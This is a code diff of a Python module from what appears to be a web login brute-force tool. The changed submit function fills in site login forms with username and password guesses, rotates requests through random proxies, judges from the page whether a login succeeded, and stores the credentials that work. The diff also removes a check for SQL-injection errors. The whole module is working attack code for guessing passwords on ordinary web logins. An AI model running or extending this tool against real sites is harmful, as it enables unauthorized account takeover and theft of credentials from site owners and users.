@@ -1,144 +1,96 @@
-from core.mbrowser import parseLoginForm, startBrowser, sqlerror
-from core.utils import printf, die
-from core.actions import randomFromList
+from utils import events
+from cores.actions import randomFromList
+from cores.check import parseLoginForm
+
 
 def check_condition(options, proc, loginInfo):
+	"""
+		Check logged in successfully condition.
+		This function will check SQL injection as well
+			return 0 -> False
+			return 1 -> True
+			return 2 -> Should be SQL Injection error-based
+	"""
 	if options.panel_url:
 		# User provided panel url (/wp-admin/ for example, repopen this url to check sess)
-		proc.open(options.panel_url)
-		if not parseLoginForm(proc.forms()):# != loginInfo:
-			if sqlerror(proc.response().read()):
-				return 2
-			else:
-				return 1
+		proc.open_url(options.panel_url)
+		if not parseLoginForm(proc.forms()):  # != loginInfo:
+			return 1
 		else:
 			return 0
 	else:
-		# User provided direct login URL (/wp-login.php).
-		if sqlerror(proc.response().read()):
-			return 2
-		else:
-			return 1
+		return 1
 
 
 def submit(options, loginInfo, tryCred, result):
-
-	#	Get login form field informations
-	
 	# frmLoginID, frmFields = loginInfo
 	tryPassword, tryUsername = tryCred
-
-	proc = startBrowser()
 	
-	for cred in list(result.queue):
-		if tryUsername == cred[1]:
-			return True
+	# proc = Browser(options.timeout) # TODO recovery here
 	
-	if options.proxy:
-		# Set proxy connect
-		proxyAddr = randomFromList(options.proxy)
-		proc.set_proxies({"http": proxyAddr})
+	if tryUsername in [x[1] for x in list(result.queue)]:
+		return True
 	
+	from libs.mbrowser import Browser
 	try:
-		proc.open(options.login_url)
+		proc = Browser()
+		if options.proxy:
+			# Set proxy connect
+			proxyAddr = randomFromList(options.proxy)
+			proc.setproxy(proxyAddr)
+		else:
+			proxyAddr = ""
+		
+		proc.open_url(options.login_url)
 		_form = parseLoginForm(proc.forms())
+		
 		if not _form:
 			if options.verbose:
-				printf("[x] LoginBrute: No login form found. Possibly get blocked!")
+				events.error("Get blocked", "BRUTE")
 			return False
 		else:
-			frmLoginID, frmFields = _form
-			frmUsername, _ = frmFields
+			frmCtrl, frmFields = _form
+			frmLoginID, btnSubmit = frmCtrl
 		if options.verbose and loginInfo != _form:
-			printf("[+] Warning: Form field has been changed!")
-
+			events.info("Login form has been changed", "BRUTE")
 		#	Select login form
-		proc.select_form(nr = frmLoginID)
-		
-		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
-		proc.form[frmUsername] = tryUsername
-		proc.submit()
-		_, _, frmPasswd = parseLoginForm(proc.forms())
-		proc.form[frmPasswd] = tryPassword
-		proc.submit()
 		# page_title = proc.title()
 		#	Send request
-
-		if options.verbose:
-			if options.proxy:
-				printf("[+] Trying: %s through %s" %([tryUsername, tryPassword],proxyAddr), 'norm')
-			else:
-				printf("[+] Trying: %s" %([tryUsername, tryPassword]), 'norm')
 		
 		#	Reload the browser. For javascript redirection and others...
 		# proc.reload()
 		#	If no login form -> maybe success. Check conditions
+		resp = proc.xsubmit(frmCtrl, frmFields[1], tryUsername)
+		if resp.status_code > 400:
+			events.error("Error while sending %s" %(frmFields[1]), "BRUTE")
 		
-		if not parseLoginForm(proc.forms()):# != loginInfo:
+		resp = proc.xsubmit(frmCtrl, frmFields[0], tryPassword)
+
+		if options.verbose:
+			events.warn("['%s']['%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "TRY")
+		
+		if not parseLoginForm(proc.forms()):  # != loginInfo:
 			test_result = check_condition(options, proc, loginInfo)
-			
 			if test_result == 1:
-				printf("[*] Page title: ['%s']" %(proc.title()), "good")
-				# "If we tried login form with username+password field"
-				if tryUsername:
-					printf("[*] Found: %s" %([tryUsername, tryPassword]), "good")
-				# "Else If we tried login form with password field only"
+				if resp.status_code >= 400:
+					events.error("['%s':'%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "%s" % (resp.status_code))
 				else:
-					printf("[*] Found: %s" %([tryPassword]), "good")
-				result.put([options.url, tryUsername, tryPassword])
-			elif test_result == 2 and options.verbose:
-				printf("[+] SQL Injection vulnerable found")
-				printf("   %s" %([tryUsername, tryPassword]), "norm")
+					events.success("['%s':'%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "FOUND")
+					result.put([options.url, tryUsername, tryPassword])
+			
 			else:
 				# Possibly Error. But sometime it is true
 				if options.verbose:
-					printf("[x] Get error page: %s" %([tryUsername, tryPassword]), "bad")
-					printf("   [x] Page title: ['%s']" %(proc.title()), "bad")
-		
+					events.error("['%s': '%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "BRUTE")
 		# "Login form is still there. Oops"
 		else:
-			# TODO test if web has similar text (static)
-			if sqlerror(proc.response().read()) and options.verbose:
-				printf("[+] SQL Injection vulnerable found")
-				printf("   %s" %([tryUsername, tryPassword]), "norm")
 			if options.verbose:
-				if options.proxy:
-					printf(
-						"[-] Failed: %s through %s" %([tryUsername, tryPassword], proxyAddr),
-						"bad"
-					)
-				else:
-					printf(
-						"[-] Failed: %s" %([tryUsername, tryPassword]),
-						"bad"
-					)
+				events.fail("['%s':'%s'] <--> %s ==> %s" % (tryUsername, tryPassword, proxyAddr, proc.get_title()))
+		
 		return True
-
+	
 	except Exception as error:
-		"""
-			Sometimes, web servers return error code because of bad configurations,
-			but our cred is true.
-			This code block showing information, for special cases
-		"""		
-
-		try:
-			# Unauthenticated
-			if error.code == 401:
-				if options.verbose:
-					printf("[-] Failed: %s" %([tryUsername, tryPassword]), "bad")
-			# Server misconfiguration? Panel URL is deleted or wrong
-			elif error.code == 404:
-				printf("[x] %s: %s" %(error, tryCred[::-1]), "bad")
-				if options.verbose:
-					printf("   %s" %(proc.url()), "bad")
-			# Other error code
-			else:
-				if options.verbose:
-					printf("[x] (%s): %s" %(proc.url(), tryCred[::-1]), "bad")
-		except:
-			# THIS BLOCKED BY WAF
-			printf("[x] Loginbrute: %s" %(error), "bad")
-		return False
-
+		events.error("%s" % (error), "BRUTE")
+	
 	finally:
 		proc.close()
